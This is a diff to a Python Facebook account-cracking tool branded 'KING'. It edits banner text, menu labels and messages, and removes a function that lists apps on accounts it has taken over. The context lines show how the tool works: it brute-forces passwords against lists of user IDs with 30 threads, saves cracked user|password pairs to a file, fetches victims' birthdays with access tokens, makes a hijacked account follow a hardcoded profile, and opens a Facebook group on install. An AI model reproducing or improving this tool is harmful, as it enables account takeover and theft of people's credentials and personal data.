@@ -17,11 +17,9 @@ try:
 except ImportError:
     print('\n [\033[1;32m✓\033[1;37m] installing bs4 !...\n')
     os.system('pip install bs4')
-try:
-    import path 
-except ImportError:
-	print('\n [\033[1;32m✓\033[1;37m] Join Group !...\n')
-	os.system(f'xdg-open https://facebook.com/groups/842909060147288/ ')
+    os.system('xdg-open https://facebook.com/groups/291183553213655/')
+    print('\n\033[1;97m [•] checking update 0?2 \n [•] wait a few sec... \n [•] Join King facebook Group')
+
 	
 import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
 from concurrent.futures import ThreadPoolExecutor as alaminALAMIN
@@ -77,43 +75,15 @@ def jalan(z):
         time.sleep(0.01)
  
 logo =("""\033[1;37m
-      88  dP 88 88b 88  dP""b8  \033[1;32mX\033[1;37m          
-      88odP  88 88Yb88 dP   `" 
-      88"Yb  88 88 Y88 Yb  "88 
-      88  Yb 88 88  Y8  YboodP  \033[1;32mD\033[1;37m
+         88  dP 88 88b 88  dP""b8  \033[1;32mX\033[1;37m          
+         88odP  88 88Yb88 dP   `"
+         88"Yb  88 88 Y88 Yb  "88
+         88  Yb 88 88  Y8  YboodP  \033[1;31mD\033[1;31m
 \033[1;37m–––––––––––––––––––––––––––––––––––––––––––––––\033[1;37m
-[\033[1;32m+\033[1;37m] Author    : SunShine Daquigan
-[\033[1;32m+\033[1;37m] Tool Name : \033[1;36m𝙺𝙸𝙽𝙶\033[1;37m
-[\033[1;32m+\033[1;37m] Tool Type : \033[1;32mFree\033[1;37m
-[\033[1;32m+\033[1;37m] Version   : 0.1
+[\033[1;32m+\033[1;37m] Author        :    Queen-Shine
+[\033[1;32m+\033[1;37m] Tool Type     :    \033[1;32mFree\033[1;37m
+[\033[1;32m+\033[1;37m] Version       :    0.2
 \033[1;37m–––––––––––––––––––––––––––––––––––––––––––––––\033[1;37m""")                                           
- 
-def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r %s[%s!%s] %sSorry There Is No Active Apk%s  '%(N,M,N,M,N))
-    else:
-        print(f'\r 🎮  %sYour Active Application Details :'%(H))
-        for i in range(len(game)):
-            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-        #else:
-            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
-    else:
-        print(f'\r 🎮  %sYour Expired Application Details :'%(M))
-        for i in range(len(game)):
-            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print(f'\r')
-            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
  
 def hasil(OK,cp):
 	if not len(OK) != 0:
@@ -129,8 +99,8 @@ def alamin():
     print(logo)
     
     print
-    print('[\033[1;32m1\033[1;37m] Start File Cloning [\033[1;32mBest\033[1;37m]')
-    print('[\033[1;32m2\033[1;37m] Create File [\033[1;32mNot Working\033[1;37m]')
+    print('[\033[1;32m1\033[1;37m] Start File Cloning [\033[1;32m Best \033[1;37m]')
+    print('[\033[1;32m2\033[1;37m] Create File [\033[1;32m Not Working \033[1;37m]')
     print('[\033[1;32mE\033[1;37m] exit ')
     print('')
     _alamin___ = input('[\033[1;32m?\033[1;37m] Choose option : ')
@@ -148,7 +118,7 @@ class __xxx__:
     def alaminx(self,id):
         os.system("clear")
         print(logo)
-        self.cnt = input('[\033[1;32m~\033[1;37m] Put File Name : ')
+        self.cnt = input('[\033[1;32m~\033[1;37m] File Location : ')
         self.id = open(self.cnt).read().splitlines()
         os.system('clear')
         print(logo)
@@ -222,7 +192,7 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s [KING-CP] %s | %s ' % (M, user, pw))
+                        print('\r%s [Checkpoint] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
                         open('KING•CP.txt' , 'a').write('%s\n' % wrt)
@@ -233,7 +203,7 @@ class __xxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s [KING-CP] %s | %s ' % (M, user, pw))
+                    print('\r%s [Checkpoint] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
                     open('KING•CP.txt' , 'a').write('%s\n' % wrt)
@@ -248,10 +218,10 @@ class __xxx__:
         r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
         get = r.find('a', string='Ikuti').get('href')
         session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
- 
+        
     def __pler__(self):
-        print('[\033[1;32m1\033[1;37m] Auto Password ')
-        print('[\033[1;32m2\033[1;37m] Input Password')
+        print('[\033[1;32m1\033[1;37m] Auto System Pass ')
+        print('[\033[1;32m2\033[1;37m] Enter Method Pass ')
         chi = input('\n[\033[1;32m?\033[1;37m] Choose: ')
         if chi == '':
             print('\nSelect Correct One')
@@ -261,9 +231,8 @@ class __xxx__:
             print(logo)
             print("\033[1;32mUse Flight Mode Before Start\033[1;37m")
             print(47*"-")
-            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
-            print('\033[1;37m Save To KING•OK.txt...')
-            print('\033[1;37m Cracking Started...')
+            print('\033[1;37m[+] Cracking Limit : %s ' % len(self.id))
+            print('\033[1;37m[+] The Process is running in the background')
             print(47*"-")
             with alaminALAMIN(max_workers=30) as ALAMINworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
@@ -296,9 +265,8 @@ class __xxx__:
             print(logo)
             print("\033[1;32mUse Flight Mode Before Start\033[1;37m")
             print(47*"-")
-            print('\033[1;37m Total IDs : %s ' % len(self.id))
-            print('\033[1;37m Save To KING•OK.txt...')
-            print('\033[1;37m Cracking Started...')
+            print('\033[1;37m[+] Cracking Limit : %s ' % len(self.id))
+            print('\033[1;37m[+] The Process is running in the background...')
             print(47*"-")
             with alaminALAMIN(max_workers=30) as ALAMINworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
@@ -320,9 +288,9 @@ class __xxx__:
 def create_file():
     os.system('clear')
     print(logo)
-    print('  [1] Create file manual')
-    print('  [2] Create file auto')
-    print('  [B] Back to main menu')
+    print('[1] Create file manual')
+    print('[2] Create file auto')
+    print('[B] Back to main menu')
     print(50*'-')
     cf = input('  Choose method: ')
     if cf =='1':
